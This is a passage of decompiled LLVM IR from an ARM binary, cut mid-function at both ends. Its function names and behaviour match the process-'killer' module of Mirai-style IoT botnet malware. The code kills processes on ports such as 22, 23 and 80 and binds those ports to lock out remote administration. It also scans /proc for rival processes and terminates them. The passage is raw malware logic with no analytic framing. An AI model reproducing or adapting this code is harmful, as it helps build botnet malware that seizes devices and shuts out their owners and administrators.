  store i32 %v2_c9c4, i32* @r0, align 4
  br i1 %v2_ce28, label %dec_label_pc_ce3c, label %dec_label_pc_cd4c

dec_label_pc_ce3c:                                ; preds = %dec_label_pc_cd34.loopexit, %dec_label_pc_ce14, %dec_label_pc_cd4c, %dec_label_pc_cd34.preheader
  %v0_ce3c = load i32, i32* @r8, align 4
  %v1_ce40 = inttoptr i32 %v0_ce3c to i32*
  %v2_ce40 = call i32 @__GI_closedir(i32* %v1_ce40)
  %v0_ce44 = load i32, i32* @sb, align 4
  %v1_ce48 = inttoptr i32 %v0_ce44 to i32*
  %v2_ce48 = call i32 @__GI_readdir(i32* %v1_ce48)
  %v2_ce4c = icmp eq i32 %v2_ce48, 0
  br i1 %v2_ce4c, label %dec_label_pc_ce54, label %dec_label_pc_cc50

dec_label_pc_ce54:                                ; preds = %dec_label_pc_cc40.loopexit, %dec_label_pc_ce3c, %dec_label_pc_cc50, %dec_label_pc_cc40.preheader
  %v0_ce54 = load i32, i32* @sb, align 4
  %v1_ce58 = inttoptr i32 %v0_ce54 to i32*
  %v2_ce58 = call i32 @__GI_closedir(i32* %v1_ce58)
  %v0_ce5c = load i32, i32* @r5, align 4
  %v1_ce5c = urem i32 %v0_ce5c, 256
  br label %dec_label_pc_ce60

dec_label_pc_ce60:                                ; preds = %dec_label_pc_cc20, %dec_label_pc_ce54
  %storemerge = phi i32 [ %v1_ce5c, %dec_label_pc_ce54 ], [ 0, %dec_label_pc_cc20 ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_ce64 = call i32 @sleep(i32 1)
  %v1_ce6c = call i32 @table_lock_val(i32 13)
  %v1_ce74 = call i32 @table_lock_val(i32 14)
  %v1_ce7c = call i32 @table_lock_val(i32 15)
  br label %dec_label_pc_ce80

dec_label_pc_ce80:                                ; preds = %bb, %dec_label_pc_cec0, %dec_label_pc_ce60
  %v0_ce80 = load i32, i32* @r4, align 4
  store i32 %v3_c97c, i32* @r4, align 4
  store i32 %v6_c97c, i32* @r5, align 4
  store i32 %v9_c97c, i32* @r6, align 4
  store i32 %v12_c97c, i32* @r7, align 4
  store i32 %v15_c97c, i32* @r8, align 4
  store i32 %v18_c97c, i32* @sb, align 4
  store i32 %v21_c97c, i32* @sl, align 4
  store i32 %v24_c97c, i32* @fp, align 4
  store i32 %v27_c97c, i32* @lr, align 4
  ret i32 %v0_ce80

dec_label_pc_ce94:                                ; preds = %dec_label_pc_cb74
  %v1_ce94 = add i32 %v0_ce94, 1
  %v7_ce98 = icmp eq i32 %v0_ce94, 0
  br i1 %v7_ce98, label %dec_label_pc_cea0, label %dec_label_pc_cb7c

dec_label_pc_cea0:                                ; preds = %dec_label_pc_ce94
  %v1_cea0 = add i32 %v0_cb84, 3
  %v2_cea0 = inttoptr i32 %v1_cea0 to i8*
  %v3_cea0 = load i8, i8* %v2_cea0, align 1
  %v7_cea4 = icmp eq i8 %v3_cea0, 65
  br i1 %v7_cea4, label %dec_label_pc_ceb8, label %dec_label_pc_ceac

dec_label_pc_ceac:                                ; preds = %dec_label_pc_cea0, %dec_label_pc_ceb8
  %v0_cb8c82 = phi i32 [ %v0_cb8c83, %dec_label_pc_cea0 ], [ 1, %dec_label_pc_ceb8 ]
  br label %dec_label_pc_cb54.backedge

dec_label_pc_cb54.backedge:                       ; preds = %dec_label_pc_ceac, %dec_label_pc_cb80
  %v0_cb8c81 = phi i32 [ %v0_cb8c82, %dec_label_pc_ceac ], [ %v0_cb8c83, %dec_label_pc_cb80 ]
  %v0_ce9473 = phi i32 [ %v1_ce94, %dec_label_pc_ceac ], [ %v0_cb80, %dec_label_pc_cb80 ]
  %v0_cb74.pr70 = phi i32 [ 0, %dec_label_pc_ceac ], [ %v0_cb74.pr71, %dec_label_pc_cb80 ]
  %v0_cb54 = add i32 %v0_cb84, 1
  %v1_cb54 = add i32 %v0_cb84, 3
  %v2_cb54 = inttoptr i32 %v1_cb54 to i8*
  %v3_cb54 = load i8, i8* %v2_cb54, align 1
  %v4_cb54 = zext i8 %v3_cb54 to i32
  store i32 %v4_cb54, i32* @r3, align 4
  %v2_cb58 = icmp eq i8 %v3_cb54, 0
  %v1_cb5c = add i32 %v0_cb5c78, 1
  br i1 %v2_cb58, label %dec_label_pc_cb8c, label %dec_label_pc_cb64

dec_label_pc_ceb8:                                ; preds = %dec_label_pc_cea0
  store i32 1, i32* @lr, align 4
  br label %dec_label_pc_ceac

dec_label_pc_cec0:                                ; preds = %dec_label_pc_cc04
  %v1_cec4 = call i32 @table_lock_val(i32 13)
  %v1_cecc = call i32 @table_lock_val(i32 14)
  %v1_ced4 = call i32 @table_lock_val(i32 15)
  %v1_cedc = call i32 @table_lock_val(i32 17)
  br label %dec_label_pc_ce80

dec_label_pc_cee4:                                ; preds = %entry
  store i8 48, i8* %stack_var_-72, align 1
  br label %dec_label_pc_ca28

; uselistorder directives
  uselistorder i32 %v1_cb5c, { 1, 0 }
  uselistorder i32 %v4_cb54, { 1, 0 }
  uselistorder i32 %v0_cb8c81, { 1, 0 }
  uselistorder i32 %v1_ce94, { 1, 0 }
  uselistorder i32 %v2_ce48, { 1, 0 }
  uselistorder i32 %v1_cbb8, { 1, 0 }
  uselistorder i32 %v0_cbc430, { 1, 0 }
  uselistorder i32 %v1_cbdc, { 0, 3, 1, 2 }
  uselistorder i32 %v0_cb80, { 1, 0 }
  uselistorder i32 %v0_cb5c78, { 1, 0 }
  uselistorder i32 %v0_ce94, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_cb8c83, { 1, 2, 0 }
  uselistorder i32 %v1_cb5c54, { 1, 0 }
  uselistorder i32 %v2_cb40, { 1, 0 }
  uselistorder i32 %v1_cb3c, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v1_cafc, { 0, 2, 1 }
  uselistorder i32 %v0_cafc16, { 1, 0 }
  uselistorder i32 %v1_cac8, { 0, 2, 3, 4, 5, 6, 1 }
  uselistorder i32 %v2_ca58, { 1, 2, 0 }
  uselistorder i32 %v0_ca00, { 1, 0 }
  uselistorder i32 %v2_c9fc, { 1, 0, 2 }
  uselistorder i8* %v3_c9e4, { 1, 0, 2 }
  uselistorder i32 %v2_c9c4, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8* %stack_var_-585, { 1, 4, 0, 2, 3 }
  uselistorder i8* %stack_var_-72, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i8*, i32, i32)* @util_fdgets, { 1, 0 }
  uselistorder label %dec_label_pc_ceac, { 1, 0 }
  uselistorder label %dec_label_pc_ce80, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ce60, { 1, 0 }
  uselistorder label %dec_label_pc_ce54, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_ce3c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_cd4c, { 1, 0 }
  uselistorder label %dec_label_pc_cd4cthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_cd34.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_cc50, { 1, 0 }
  uselistorder label %dec_label_pc_cc50.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_cc40.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cbd8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cb80, { 2, 0, 1 }
  uselistorder label %dec_label_pc_cb64, { 1, 0 }
  uselistorder label %dec_label_pc_cb08, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_ca6c.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_cabc, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_ca84, { 1, 0 }
  uselistorder label %dec_label_pc_ca28, { 1, 0 }
}

define i32 @killer_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-8480 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-4328 = alloca i32, align 4
  %v3_cf10 = load i32, i32* @r4, align 4
  %v6_cf10 = load i32, i32* @r5, align 4
  %v9_cf10 = load i32, i32* @r6, align 4
  %v12_cf10 = load i32, i32* @r7, align 4
  %v15_cf10 = load i32, i32* @r8, align 4
  %v18_cf10 = load i32, i32* @sb, align 4
  %v21_cf10 = load i32, i32* @sl, align 4
  %v24_cf10 = load i32, i32* @fp, align 4
  %v27_cf10 = load i32, i32* @lr, align 4
  %v2_cf20 = call i32 @__GI_time(i32* null)
  store i32 %v2_cf20, i32* @r7, align 4
  %v0_cf28 = call i32 @__libc_fork()
  %v7_cf2c = icmp eq i32 %v0_cf28, -1
  %. = zext i1 %v7_cf2c to i32
  %tmp136 = icmp slt i32 %v0_cf28, 1
  %storemerge96 = select i1 %tmp136, i32 %., i32 1
  store i32 %storemerge96, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_25d50.71 to i32), i32* %r3.global-to-local, align 4
  %v2_cf48 = icmp eq i32 %storemerge96, 0
  store i32 %v0_cf28, i32* @global_var_25d50.71, align 4
  br i1 %v2_cf48, label %dec_label_pc_cf64, label %dec_label_pc_cf54

dec_label_pc_cf54:                                ; preds = %dec_label_pc_d080, %dec_label_pc_cf64, %entry
  %v1_cf60 = phi i32 [ %v2_d01c, %dec_label_pc_cf64 ], [ %v0_cf28, %entry ], [ 0, %dec_label_pc_d080 ]
  store i32 %v3_cf10, i32* @r4, align 4
  store i32 %v6_cf10, i32* @r5, align 4
  store i32 %v9_cf10, i32* @r6, align 4
  store i32 %v12_cf10, i32* @r7, align 4
  store i32 %v15_cf10, i32* @r8, align 4
  store i32 %v18_cf10, i32* @sb, align 4
  store i32 %v21_cf10, i32* @sl, align 4
  store i32 %v24_cf10, i32* @fp, align 4
  store i32 %v27_cf10, i32* @lr, align 4
  ret i32 %v1_cf60

dec_label_pc_cf64:                                ; preds = %entry
  %v1_cf68 = call i32 @sleep(i32 5)
  store i32 4096, i32* @r0, align 4
  %v0_cf70 = call i32 @malloc()
  store i32 ptrtoint (i32* @global_var_23230.73 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_25d4c.75 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_cf70, i32* %r2.global-to-local, align 4
  %v0_cf80 = load i32, i32* @r5, align 4
  %v1_cf80 = trunc i32 %v0_cf80 to i8
  %v3_cf80 = inttoptr i32 %v0_cf70 to i8*
  store i8 %v1_cf80, i8* %v3_cf80, align 1
  %v0_cf88 = load i32, i32* @r5, align 4
  %v1_cf88 = load i32, i32* %r3.global-to-local, align 4
  %v2_cf88 = inttoptr i32 %v1_cf88 to i32*
  store i32 %v0_cf88, i32* %v2_cf88, align 4
  %v0_cf8c = load i32, i32* %r2.global-to-local, align 4
  %v1_cf8c = load i32, i32* %r1.global-to-local, align 4
  %v2_cf8c = inttoptr i32 %v1_cf8c to i32*
  store i32 %v0_cf8c, i32* %v2_cf8c, align 4
  %v1_cf90 = call i32 @table_unlock_val(i32 13)
  %v1_cf98 = call i32 @table_unlock_val(i32 14)
  %v2_cfa0 = ptrtoint i32* %stack_var_-4328 to i32
  store i32 %v2_cfa0, i32* %r2.global-to-local, align 4
  %v0_cfa4 = load i32, i32* @r5, align 4
  store i32 %v0_cfa4, i32* %r1.global-to-local, align 4
  %v2_cfb0 = inttoptr i32 %v0_cfa4 to i32*
  %v3_cfb0 = call i32 @table_retrieve_val(i32 13, i32* %v2_cfb0)
  %v1_cfb8 = add i32 %v2_cfa0, -56
  store i32 %v1_cfb8, i32* %r3.global-to-local, align 4
  store i32 %v3_cfb0, i32* %r1.global-to-local, align 4
  store i32 %v1_cfb8, i32* @r0, align 4
  %v2_cfc8 = inttoptr i32 %v1_cfb8 to i8*
  %v3_cfc8 = call i32 @util_strcpy(i8* %v2_cfc8, i32 %v3_cfb0)
  %v2_cfd0 = add i32 %v3_cfc8, %v1_cfb8
  store i32 %v2_cfd0, i32* @r4, align 4
  %v1_cfd4 = call i32 @__getpid(i32 %v3_cfc8)
  %v2_cfdc = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_cfdc, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_cfe4 = trunc i32 %v1_cfd4 to i8
  %v4_cfe4 = call i32 @util_itoa(i8 %v3_cfe4, i32 10, i32 %v2_cfdc)
  store i32 %v4_cfe4, i32* %r1.global-to-local, align 4
  %v0_cfec = load i32, i32* @r4, align 4
  store i32 %v0_cfec, i32* @r0, align 4
  %v2_cff0 = inttoptr i32 %v0_cfec to i8*
  %v3_cff0 = call i32 @util_strcpy(i8* %v2_cff0, i32 %v4_cfe4)
  %v0_cff4 = load i32, i32* @r5, align 4
  store i32 %v0_cff4, i32* %r1.global-to-local, align 4
  %v1_cff8 = load i32, i32* @r4, align 4
  %v2_cff8 = add i32 %v1_cff8, %v3_cff0
  store i32 %v2_cff8, i32* @r4, align 4
  %v2_d000 = inttoptr i32 %v0_cff4 to i32*
  %v3_d000 = call i32 @table_retrieve_val(i32 14, i32* %v2_d000)
  store i32 %v3_d000, i32* %r1.global-to-local, align 4
  %v0_d008 = load i32, i32* @r4, align 4
  store i32 %v0_d008, i32* @r0, align 4
  %v2_d00c = inttoptr i32 %v0_d008 to i8*
  %v3_d00c = call i32 @util_strcpy(i8* %v2_d00c, i32 %v3_d000)
  %v0_d010 = load i32, i32* @r5, align 4
  store i32 %v0_d010, i32* %r1.global-to-local, align 4
  store i32 %v3_d00c, i32* @r6, align 4
  %v2_d01c = call i32 @__libc_open(i32 %v1_cfb8, i32 %v0_d010)
  %v7_d020 = icmp eq i32 %v2_d01c, -1
  br i1 %v7_d020, label %dec_label_pc_cf54, label %dec_label_pc_d028

dec_label_pc_d028:                                ; preds = %dec_label_pc_cf64
  %v1_d028 = call i32 @__GI___libc_close(i32 %v2_d01c)
  %v1_d030 = call i32 @table_lock_val(i32 13)
  %v1_d038 = call i32 @table_lock_val(i32 14)
  store i32 ptrtoint (i32* @global_var_25d4c.75 to i32), i32* @lr, align 4
  %v2_d044 = load i32, i32* @global_var_25d4c.75, align 4
  store i32 %v2_d044, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v3_d050 = call i32 @readlink(i32 %v1_cfb8, i32 %v2_d044, i32 4095)
  %v7_d054 = icmp eq i32 %v3_d050, -1
  br i1 %v7_d054, label %.thread9, label %bb139

bb139:                                            ; preds = %dec_label_pc_d028
  store i32 ptrtoint (i32* @global_var_25d4c.75 to i32), i32* %r1.global-to-local, align 4
  %v3_d05c = load i32, i32* @global_var_25d4c.75, align 4
  store i32 %v3_d05c, i32* %r3.global-to-local, align 4
  %v1_d060 = load i32, i32* @r5, align 4
  %v2_d060 = trunc i32 %v1_d060 to i8
  %v5_d060 = add i32 %v3_d05c, %v3_d050
  %v6_d060 = inttoptr i32 %v5_d060 to i8*
  store i8 %v2_d060, i8* %v6_d060, align 1
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_d028, %bb139
  store i32 %v1_cfb8, i32* %r2.global-to-local, align 4
  %v0_d068 = load i32, i32* @r6, align 4
  %v1_d068 = load i32, i32* @r4, align 4
  %v1_cfb8.neg = sub i32 56, %v2_cfa0
  %v2_d068 = add i32 %v1_cfb8.neg, %v0_d068
  %v2_d06c = add i32 %v2_d068, %v1_d068
  store i32 %v2_d06c, i32* @r1, align 4
  store i32 %v1_cfb8, i32* @r0, align 4
  %v0_d074 = call i32 @util_zero()
  %v0_d078 = load i32, i32* @r5, align 4
  store i32 400, i32* @sl, align 4
  %v2_d110 = ptrtoint i32* %stack_var_-304 to i32
  %v2_d380 = ptrtoint i32* %stack_var_-224 to i32
  %v2_d38c = bitcast i32* %stack_var_-224 to i8*
  %v2_d3d0 = ptrtoint i32* %stack_var_-288 to i32
  %v2_d3d4 = bitcast i32* %stack_var_-288 to i8*
  %v2_d520 = ptrtoint i32* %stack_var_-44 to i32
  %v2_d52c = ptrtoint i32* %stack_var_-48 to i32
  %v2_d544 = ptrtoint i32* %stack_var_-8480 to i32
  %v2_d290 = ptrtoint i32* %stack_var_-144 to i32
  %v2_d258 = ptrtoint i32* %stack_var_-128 to i32
  %v2_d220 = ptrtoint i32* %stack_var_-112 to i32
  %v2_d1ec = ptrtoint i32* %stack_var_-96 to i32
  %v2_d1b4 = ptrtoint i32* %stack_var_-80 to i32
  %v2_d16c = ptrtoint i32* %stack_var_-64 to i32
  br label %dec_label_pc_d080

dec_label_pc_d080:                                ; preds = %dec_label_pc_d348, %.thread9
  %stack_var_-8484.0 = phi i32 [ %v0_d078, %.thread9 ], [ %stack_var_-8484.3, %dec_label_pc_d348 ]
  %v1_d084 = call i32 @table_unlock_val(i32 13)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d090 = call i32 @table_retrieve_val(i32 13, i32* null)
  %v1_d094 = call i32 @__GI_opendir(i32 %v3_d090)
  store i32 %v1_d094, i32* @fp, align 4
  %v2_d098 = icmp eq i32 %v1_d094, 0
  br i1 %v2_d098, label %dec_label_pc_cf54, label %dec_label_pc_d0a0

dec_label_pc_d0a0:                                ; preds = %dec_label_pc_d080
  %v1_d0a4 = call i32 @table_lock_val(i32 13)
  %v1_d0b0 = call i32 @killer_kill_by_port(i32 58811)
  %v1_d0bc = call i32 @killer_kill_by_port(i32 add (i32 ptrtoint (i32* @global_var_c700.76 to i32), i32 7))
  %v1_d0c8 = call i32 @killer_kill_by_port(i32 14853)
  %v1_d0d0 = call i32 @killer_kill_by_port(i32 20480)
  %v1_d0dc = call i32 @killer_kill_by_port(i32 ptrtoint (i32* @global_var_bb01.77 to i32))
  %v1_d0e8 = call i32 @killer_kill_by_port(i32 add (i32 ptrtoint (i32* @global_var_e100.78 to i32), i32 16))
  %v1_d0f4 = call i32 @killer_kill_by_port(i32 2842)
  %v1_d100 = call i32 @killer_kill_by_port(i32 10522)
  %v1_d108 = call i32 @killer_kill_by_port(i32 5632)
  store i32 %v2_d110, i32* @lr, align 4
  store i32 20480, i32* %r3.global-to-local, align 4
  store i32 24465, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d158 = call i32 @socket(i32 2, i32 1, i32 0)
  %v7_d15c = icmp eq i32 %v3_d158, -1
  store i32 %v3_d158, i32* @r4, align 4
  br i1 %v7_d15c, label %dec_label_pc_d184, label %dec_label_pc_d168

dec_label_pc_d168:                                ; preds = %dec_label_pc_d0a0
  store i32 %v2_d16c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d174 = call i32 @bind(i32 %v3_d158, i32 %v2_d16c, i32 16)
  %v0_d178 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d180 = call i32 @listen(i32 %v0_d178, i32 1)
  br label %dec_label_pc_d184

dec_label_pc_d184:                                ; preds = %dec_label_pc_d0a0, %dec_label_pc_d168
  %v1_d188 = call i32 @killer_kill_by_port(i32 5888)
  %v2_d18c = icmp eq i32 %v1_d188, 0
  br i1 %v2_d18c, label %dec_label_pc_d64c, label %dec_label_pc_d194

dec_label_pc_d194:                                ; preds = %dec_label_pc_d670, %dec_label_pc_d660, %dec_label_pc_d64c, %dec_label_pc_d184, %dec_label_pc_d684
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d1a0 = call i32 @socket(i32 2, i32 1, i32 0)
  %v7_d1a4 = icmp eq i32 %v3_d1a0, -1
  store i32 %v3_d1a0, i32* %r4.global-to-local, align 4
  br i1 %v7_d1a4, label %dec_label_pc_d1cc, label %dec_label_pc_d1b0

dec_label_pc_d1b0:                                ; preds = %dec_label_pc_d194
  store i32 %v2_d1b4, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d1bc = call i32 @bind(i32 %v3_d1a0, i32 %v2_d1b4, i32 16)
  %v0_d1c0 = load i32, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d1c8 = call i32 @listen(i32 %v0_d1c0, i32 1)
  br label %dec_label_pc_d1cc

dec_label_pc_d1cc:                                ; preds = %dec_label_pc_d194, %dec_label_pc_d1b0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d1d8 = call i32 @socket(i32 2, i32 1, i32 0)
  %v7_d1dc = icmp eq i32 %v3_d1d8, -1
  store i32 %v3_d1d8, i32* %r4.global-to-local, align 4
  br i1 %v7_d1dc, label %dec_label_pc_d204, label %dec_label_pc_d1e8

dec_label_pc_d1e8:                                ; preds = %dec_label_pc_d1cc
  store i32 %v2_d1ec, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d1f4 = call i32 @bind(i32 %v3_d1d8, i32 %v2_d1ec, i32 16)
  %v0_d1f8 = load i32, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d200 = call i32 @listen(i32 %v0_d1f8, i32 1)
  br label %dec_label_pc_d204

dec_label_pc_d204:                                ; preds = %dec_label_pc_d1cc, %dec_label_pc_d1e8
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d210 = call i32 @socket(i32 2, i32 1, i32 0)
  %v7_d214 = icmp eq i32 %v3_d210, -1
  store i32 %v3_d210, i32* %r4.global-to-local, align 4
  br i1 %v7_d214, label %dec_label_pc_d238, label %dec_label_pc_d220

dec_label_pc_d220:                                ; preds = %dec_label_pc_d204
  store i32 %v2_d220, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d228 = call i32 @bind(i32 %v3_d210, i32 %v2_d220, i32 16)
  %v0_d22c = load i32, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d234 = call i32 @listen(i32 %v0_d22c, i32 1)
  br label %dec_label_pc_d238

dec_label_pc_d238:                                ; preds = %dec_label_pc_d204, %dec_label_pc_d220
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d244 = call i32 @socket(i32 2, i32 1, i32 0)
  %v7_d248 = icmp eq i32 %v3_d244, -1
  store i32 %v3_d244, i32* %r4.global-to-local, align 4
  br i1 %v7_d248, label %dec_label_pc_d270, label %dec_label_pc_d254

dec_label_pc_d254:                                ; preds = %dec_label_pc_d238
  store i32 %v2_d258, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d260 = call i32 @bind(i32 %v3_d244, i32 %v2_d258, i32 16)
  %v0_d264 = load i32, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d26c = call i32 @listen(i32 %v0_d264, i32 1)
  br label %dec_label_pc_d270

dec_label_pc_d270:                                ; preds = %dec_label_pc_d238, %dec_label_pc_d254
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d27c = call i32 @socket(i32 2, i32 1, i32 0)
  %v7_d280 = icmp eq i32 %v3_d27c, -1
  store i32 %v3_d27c, i32* @r4, align 4
  br i1 %v7_d280, label %dec_label_pc_d2a8.preheader, label %dec_label_pc_d28c

dec_label_pc_d28c:                                ; preds = %dec_label_pc_d270
  store i32 %v2_d290, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d298 = call i32 @bind(i32 %v3_d27c, i32 %v2_d290, i32 16)
  %v0_d29c = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d2a4 = call i32 @listen(i32 %v0_d29c, i32 1)
  br label %dec_label_pc_d2a8.preheader

dec_label_pc_d2a8.preheader:                      ; preds = %dec_label_pc_d28c, %dec_label_pc_d270
  %v0_d2a860 = load i32, i32* @fp, align 4
  %v1_d2ac61 = inttoptr i32 %v0_d2a860 to i32*
  %v2_d2ac62 = call i32 @__GI_readdir(i32* %v1_d2ac61)
  %v2_d2b064 = icmp eq i32 %v2_d2ac62, 0
  br i1 %v2_d2b064, label %dec_label_pc_d348, label %dec_label_pc_d2b8.preheader

dec_label_pc_d2b8.preheader:                      ; preds = %dec_label_pc_d2a8.preheader, %dec_label_pc_d2a8.backedge
  %v0_d2b872 = phi i32 [ %v2_d2ac, %dec_label_pc_d2a8.backedge ], [ %v2_d2ac62, %dec_label_pc_d2a8.preheader ]
  %stack_var_-8484.165 = phi i32 [ %stack_var_-8484.1.be, %dec_label_pc_d2a8.backedge ], [ %stack_var_-8484.0, %dec_label_pc_d2a8.preheader ]
  br label %dec_label_pc_d2b8

dec_label_pc_d2b8:                                ; preds = %dec_label_pc_d2b8.preheader, %dec_label_pc_d330
  %v0_d2c8 = phi i32 [ %v2_d33c, %dec_label_pc_d330 ], [ %v0_d2b872, %dec_label_pc_d2b8.preheader ]
  %stack_var_-8484.2 = phi i32 [ %v1_d2dc, %dec_label_pc_d330 ], [ %stack_var_-8484.165, %dec_label_pc_d2b8.preheader ]
  %v1_d2b8 = add i32 %v0_d2c8, 11
  %v2_d2b8 = inttoptr i32 %v1_d2b8 to i8*
  %v3_d2b8 = load i8, i8* %v2_d2b8, align 1
  %v4_d2b8 = zext i8 %v3_d2b8 to i32
  %v1_d2bc = add nsw i32 %v4_d2b8, -48
  store i32 %v1_d2bc, i32* %r3.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_d2bc, 9
  br i1 %tmp, label %dec_label_pc_d2a8.backedge, label %dec_label_pc_d2c8

dec_label_pc_d2c8:                                ; preds = %dec_label_pc_d2b8
  store i32 %v1_d2b8, i32* @r6, align 4
  store i32 %v1_d2b8, i32* @r0, align 4
  %v1_d2d0 = call i32 @atol(i32 %v1_d2b8)
  %v0_d2d8 = load i32, i32* @sl, align 4
  %v1_d2dc = add i32 %stack_var_-8484.2, 1
  store i32 %v1_d2d0, i32* @r8, align 4
  %v5_d2e8 = icmp slt i32 %v0_d2d8, %v1_d2d0
  %v2_d358 = call i32 @__GI_time(i32* null)
  br i1 %v5_d2e8, label %dec_label_pc_d354, label %dec_label_pc_d2ec

dec_label_pc_d2ec:                                ; preds = %dec_label_pc_d2c8
  %v0_d2f4 = load i32, i32* @r7, align 4
  %v2_d2f4 = sub i32 %v2_d358, %v0_d2f4
  %v7_d2fc = icmp slt i32 %v2_d2f4, 601
  br i1 %v7_d2fc, label %dec_label_pc_d304, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_d2ec
  store i32 400, i32* @sl, align 4
  br label %dec_label_pc_d2a8.backedge

dec_label_pc_d304:                                ; preds = %dec_label_pc_d2ec
  %v0_d304 = load i32, i32* @r8, align 4
  %v7_d308 = icmp slt i32 %v0_d304, 401
  br i1 %v7_d308, label %dec_label_pc_d2a8.backedge, label %dec_label_pc_d30c

dec_label_pc_d30c:                                ; preds = %dec_label_pc_d304
  store i32 %v1_d2dc, i32* @lr, align 4
  %v3_d314 = zext i32 %v1_d2dc to i64
  %v4_d314 = mul nuw i64 %v3_d314, 3435973837
  %v3_d3181 = udiv i64 %v4_d314, 34359738368
  %v3_d31c3 = mul nuw nsw i64 %v3_d3181, 8
  %v3_d31c = trunc i64 %v3_d31c3 to i32
  store i32 %v3_d31c, i32* %r3.global-to-local, align 4
  %v2_d3205 = mul nuw nsw i64 %v3_d3181, 2
  %v2_d320 = trunc i64 %v2_d3205 to i32
  %v2_d324 = add i32 %v3_d31c, %v2_d320
  store i32 %v2_d324, i32* %r2.global-to-local, align 4
  %v9_d328 = icmp eq i32 %v1_d2dc, %v2_d324
  br i1 %v9_d328, label %dec_label_pc_d330, label %dec_label_pc_d2a8.backedge

dec_label_pc_d330:                                ; preds = %dec_label_pc_d30c
  %v1_d334 = call i32 @sleep(i32 1)
  %v0_d338 = load i32, i32* @fp, align 4
  %v1_d33c = inttoptr i32 %v0_d338 to i32*
  %v2_d33c = call i32 @__GI_readdir(i32* %v1_d33c)
  %v2_d340 = icmp eq i32 %v2_d33c, 0
  br i1 %v2_d340, label %dec_label_pc_d348, label %dec_label_pc_d2b8

dec_label_pc_d348:                                ; preds = %dec_label_pc_d2a8.backedge, %dec_label_pc_d330, %dec_label_pc_d2a8.preheader
  %stack_var_-8484.3 = phi i32 [ %stack_var_-8484.0, %dec_label_pc_d2a8.preheader ], [ %v1_d2dc, %dec_label_pc_d330 ], [ %stack_var_-8484.1.be, %dec_label_pc_d2a8.backedge ]
  %v0_d348 = load i32, i32* @fp, align 4
  %v1_d34c = inttoptr i32 %v0_d348 to i32*
  %v2_d34c = call i32 @__GI_closedir(i32* %v1_d34c)
  br label %dec_label_pc_d080

dec_label_pc_d354:                                ; preds = %dec_label_pc_d2c8
  %v1_d364 = call i32 @table_unlock_val(i32 13)
  %v1_d36c = call i32 @table_unlock_val(i32 14)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d378 = call i32 @table_retrieve_val(i32 13, i32* null)
  store i32 %v2_d380, i32* @sb, align 4
